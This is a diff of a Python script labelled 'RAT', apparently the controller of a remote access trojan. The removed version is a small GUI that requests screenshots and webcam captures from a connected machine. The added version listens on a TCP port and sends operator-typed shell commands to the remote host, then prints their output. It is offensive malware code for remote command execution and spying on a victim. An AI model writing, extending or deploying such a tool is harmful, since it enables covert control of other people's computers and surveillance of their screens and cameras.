@@ -1,50 +1,23 @@
-from socket import *
-from tkinter import *
+import socket, pickle,struct,imutils, sys
+from PIL import Image
+import struct
+import numpy
+import cv2
 
-def screen():
-	try:
-		host = ''
-		port = 6522
-		addr = (host,port)
-		tcp_socket = socket(AF_INET, SOCK_STREAM)
-		tcp_socket.bind(addr)
-		tcp_socket.listen(90)
-		conn, addr = tcp_socket.accept()
-		data = conn.recv(1024)
-		command = '1'
-		conn.send(command.encode())
-		f = open("screenS.png", "wb")
-		image_chuck = conn.recv(1024)
-		while image_chuck:
-			f.write(image_chunk)
-			image_chuck = conn.recv(1024)
-		f.close()
-		conn.close()
-		tcp_socket.close()
-	except:
-		pass
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = ''
+port = 3333
+s.bind((host, port))
+s.listen(1)
+conn, addr = s.accept()
+print(addr)
 
-def WebCam():
-	try:
-		host = ''
-		port = 6522
-		addr = (host,port)
-		tcp_socket = socket(AF_INET, SOCK_STREAM)
-		tcp_socket.bind(addr)
-		tcp_socket.listen(90)
-		conn, addr = tcp_socket.accept()
-		data = conn.recv(1024)
-		command = '2'
-		conn.send(command.encode())
-		conn.close()
-		tcp_socket.close()
-	except:
-		pass
-
-window = Tk()
-window.title("RAT")
-window.geometry("200x200")
-Label(text="Remote Administration Tools").pack()
-btn_screen = Button(text="ScreenShot", command=screen).pack()
-btn_webcam = Button(text="WebCam", command=WebCam).pack()
-window.mainloop()
+while True:
+    a = input('/cmd - Сommand line\n/screen - ScreenShot\n > ')
+    conn.send(a.encode())
+    if a == '/cmd':
+        cmd = input('#> ')
+        conn.send(cmd.encode())
+        cmd_process = conn.recv(5000)
+        cmd_process = str(cmd_process, "cp866")
+        print(cmd_process)
